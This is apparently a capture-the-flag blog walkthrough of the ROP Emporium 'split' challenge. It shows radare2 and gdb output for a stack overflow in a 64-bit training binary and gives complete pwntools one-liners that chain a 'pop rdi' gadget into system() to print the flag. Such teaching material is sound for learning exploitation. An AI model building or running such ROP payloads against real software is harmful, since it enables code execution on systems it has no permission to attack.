---
layout:     post
title:      'ROP Emporium - split'
date:       2019-01-28 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

Today we're going to deal with challenge slightly more difficult than the previous one. Together with the knowledge of the `ret2win` challenge, this one should help us discover different techniques and tricks that may come handy during dealing with similar binaries.

Once again we are looking at an ELF executable. 

```text
[w3ndige@main split]$ file split 
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped
```
And once again, we have `NX` set, so no execution on the stack.

```text
[w3ndige@main split]$ r2 -AAA ./split 
[x] Analyze all flags starting with sym. and entry0 (aa)
[Invalid instruction of 860 bytes at 0x4000ec
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- Your problems are solved in an abandoned branch somewhere
[0x00400650]> i~nx
nx       true
```

Let's list the functions to see what we're dealing with. With `radare2` you can use it with `afl` command.

```text
[0x00400650]> afl
0x00400048    1 164          fcn.00400048
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start_400640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    4 58   -> 55   sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry.init0
0x00400746    1 111          sym.main
0x004007b5    1 82           sym.pwnme
0x00400807    1 17           sym.usefulFunction
0x00400820    4 101          sym.__libc_csu_init
0x00400890    1 2            sym.__libc_csu_fini
0x00400894    1 9            sym._fini
```

This time we have three functions `main` - from which we're going to start our analysis, `pwnme` which looks like the most interesting function and in the last, there is `usefulFunction`.

The only interesting thing in main is call to `pwnme`. 

```text
[0x00400650]> pdf @main
            ;-- main:
/ (fcn) sym.main 111
|   sym.main (int argc, char **argv, char **envp);
|           ; DATA XREF from entry0 (0x40066d)
|           0x00400746      55             push rbp
|           0x00400747      4889e5         mov rbp, rsp
|           0x0040074a      488b052f0920.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; obj.__TMC_END ; [0x601080:8]=0
|           0x00400751      b900000000     mov ecx, 0
|           0x00400756      ba02000000     mov edx, 2
|           0x0040075b      be00000000     mov esi, 0
|           0x00400760      4889c7         mov rdi, rax
|           0x00400763      e8c8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00400768      488b05310920.  mov rax, qword [obj.stderr__GLIBC_2.2.5] ; [0x6010a0:8]=0
|           0x0040076f      b900000000     mov ecx, 0
|           0x00400774      ba02000000     mov edx, 2
|           0x00400779      be00000000     mov esi, 0
|           0x0040077e      4889c7         mov rdi, rax
|           0x00400781      e8aafeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00400786      bfa8084000     mov edi, str.split_by_ROP_Emporium ; 0x4008a8 ; "split by ROP Emporium"
|           0x0040078b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400790      bfbe084000     mov edi, str.64bits         ; 0x4008be ; "64bits\n"
|           0x00400795      e836feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040079a      b800000000     mov eax, 0
|           0x0040079f      e811000000     call sym.pwnme
|           0x004007a4      bfc6084000     mov edi, str.Exiting        ; 0x4008c6 ; "\nExiting"
|           0x004007a9      e822feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007ae      b800000000     mov eax, 0
|           0x004007b3      5d             pop rbp
\           0x004007b4      c3             ret
```

So we'll go with flow of the program and analyze `pwnme` function. 

```text
[0x00400650]> pdf @sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var int local_20h @ rbp-0x20
|           ; CALL XREF from sym.main (0x40079f)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, qword [local_20h]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32
|           0x004007c6      be00000000     mov esi, 0
|           0x004007cb      4889c7         mov rdi, rax
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bfd0084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x4008d0 ; "Contriving a reason to ask user for data..."
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bffc084000     mov edi, 0x4008fc
|           0x004007e2      b800000000     mov eax, 0
|           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007ec      488b159d0820.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x601090:8]=0
|           0x004007f3      488d45e0       lea rax, qword [local_20h]
|           0x004007f7      be60000000     mov esi, 0x60               ; '`' ; 96
|           0x004007fc      4889c7         mov rdi, rax
|           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400804      90             nop
|           0x00400805      c9             leave
\           0x00400806      c3             ret
```

Here we have similar scenario, we have a `32` byte buffer that can be overflowed with `fgets` that takes 96 characters from the user. So can we, once again, overflow the `RIP` register?

Let's analyze it in `gdb` with patterns. 

```text
gdb-peda$ pattern_create 100 input
Writing pattern of 100 chars to filename "input"
gdb-peda$ r < input
Starting program: /home/w3ndige/hacking/rop_emporium/split/split < input
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdd30 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RBX: 0x0 
RCX: 0xfbad2088 
RDX: 0x7fffffffdd30 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RSI: 0x7ffff7f92730 --> 0x0 
RDI: 0x7fffffffdd31 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdd58 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RIP: 0x400806 (<pwnme+81>:	ret)
R8 : 0x0 
R9 : 0x77 ('w')
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde40 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ff <pwnme+74>:	call   0x400620 <fgets@plt>
   0x400804 <pwnme+79>:	nop
   0x400805 <pwnme+80>:	leave  
=> 0x400806 <pwnme+81>:	ret    
   0x400807 <usefulFunction>:	push   rbp
   0x400808 <usefulFunction+1>:	mov    rbp,rsp
   0x40080b <usefulFunction+4>:	mov    edi,0x4008ff
   0x400810 <usefulFunction+9>:	call   0x4005e0 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd58 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0008| 0x7fffffffdd60 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0016| 0x7fffffffdd68 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0024| 0x7fffffffdd70 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0032| 0x7fffffffdd78 ("IAAeAA4AAJAAfAA5AAKAAgA")
0040| 0x7fffffffdd80 ("AJAAfAA5AAKAAgA")
0048| 0x7fffffffdd88 --> 0x416741414b4141 ('AAKAAgA')
0056| 0x7fffffffdd90 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400806 in pwnme ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RAX] --> offset 0 - size ~95
[RDX] --> offset 0 - size ~95
[RDI] --> offset 1 - size ~94
[RSP] --> offset 40 - size ~55
Pattern buffer found at:
0x00602260 : offset    0 - size  100 ([heap])
0x00007fffffffdd30 : offset    0 - size   95 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007ffff7f90878 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f90880 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f90888 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f90890 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f90898 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007fffffffb120 : 0x00007fffffffdd30 ($sp + -0x2c38 [-2830 dwords])
0x00007fffffffd980 : 0x00007fffffffdd30 ($sp + -0x3d8 [-246 dwords])
0x00007fffffffd9a0 : 0x00007fffffffdd30 ($sp + -0x3b8 [-238 dwords])
0x00007fffffffdca0 : 0x00007fffffffdd30 ($sp + -0xb8 [-46 dwords])
0x00007fffffffdcb8 : 0x00007fffffffdd30 ($sp + -0xa0 [-40 dwords])
0x00007fffffffdce8 : 0x00007fffffffdd30 ($sp + -0x70 [-28 dwords])
```

Here we can see that it takes `40` bytes to overfill `RSP` register, and here we can use technique from the previous challenge to call another function. Probably `usefulFunction`?

Let's hop back to `radare2` once again, and analyze this part of binary.

```text
[0x00400650]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bfff084000     mov edi, str.bin_ls         ; 0x4008ff ; "/bin/ls"
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
```

Here we can see that it calls `system()` function that will execute `/bin/ls`. As I like creating exploits sequentially, let's firstly try to call this function, then we'll see what we can do after and what will work out, or what will fail. 

Address of this function is `0x00400807` so we need 40 bytes of gibberish data and this address. 

Simple as it is, right?

```text
[w3ndige@main split]$ python2 -c 'from pwn import *;print("A" * 40 + p64(0x00400807))' > input
```

I am using `pwntools` and `python2` as they seem to work much better with payloads than `python3`, plus `pwntools` greatly simplifies the work.

Executing it in `gdb`, and we get successful `/bin/ls`. 

```text
gdb-peda$ r < input
Starting program: /home/w3ndige/hacking/rop_emporium/split/split < input
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> [Attaching after process 3463 fork to child process 3464]
[New inferior 2 (process 3464)]
[Detaching after fork from parent process 3463]
[Inferior 1 (process 3463) detached]
process 3464 is executing new program: /usr/bin/bash
process 3464 is executing new program: /usr/bin/ls
flag.txt  input  split
[Inferior 2 (process 3464) exited normally]
Warning: not running or target is remote
```

Now we need to find a way to get a command that will let us view the flag. Luckily, after some analysis we can find desired string sitting in the `data` section of the binary. 

```text
[0x00400650]> izz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
...
028 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...
029 0x000008ff 0x004008ff   7   8 (.rodata) ascii /bin/ls
030 0x00000960 0x00400960   4   5 (.eh_frame) ascii \e\f\a\b
031 0x00000990 0x00400990   4   5 (.eh_frame) ascii \e\f\a\b
032 0x000009b7 0x004009b7   5   6 (.eh_frame) ascii ;*3$"
033 0x000009da 0x004009da   4   5 (.eh_frame) ascii j\f\a\b
034 0x000009fa 0x004009fa   4   5 (.eh_frame) ascii M\f\a\b
035 0x00000a19 0x00400a19   4   5 (.eh_frame) ascii L\f\a\b
036 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
...
```

That may come handy. Let's remember address of this string `0x00601060`. Now we can craft a bigger plan - by overflowing stack, move the execution into the `system()` directly. But we need to find a way to get an address of this string directly into the `RDI` register, just as it's done in normal flow of the program. 

Here comes the `ROP gadgets` that you may be already be familiar with. To simplify, they are small instruction sequences ending with a `ret` instruction. 

We can look for them with various tools, but I'm going to use [Ropper](https://github.com/sashs/Ropper). But what we're looking for? Basically, we have to get the value into the `RDI`, with limitation of only controlling the stack. Does it ring a bell? Yup, that's `pop rdi` instruction that we have to find. 

```text
[w3ndige@main split]$ ropper --file split --search 'pop rdi; ret;'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: split
0x0000000000400883: pop rdi; ret; 
```

And luckily, we get a gadget!

Now back to the crafting plan. We have to pass an address of the gadget that will pop the next value from the stack into the `RDI` register. So naturally, next address should be address of the string and as we have everything prepared, now we'll add an address of `system()` function.

```text
[w3ndige@main split]$ python2 -c 'from pwn import *;print("A" * 40 + p64(0x0400883) + p64(0x00601060) + p64(0x00400810))' > input
```

Just like that. Now let's execute it. 

```text
gdb-peda$ r < input
Starting program: /home/w3ndige/hacking/rop_emporium/split/split < input
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> [Attaching after process 4400 fork to child process 4404]
[New inferior 2 (process 4404)]
[Detaching after fork from parent process 4400]
[Inferior 1 (process 4400) detached]
process 4404 is executing new program: /usr/bin/bash
process 4404 is executing new program: /usr/bin/cat
ROPE{a_placeholder_32byte_flag!}
[Inferior 2 (process 4404) exited normally]
Warning: not running or target is remote
```

And here we are, another challenge completed.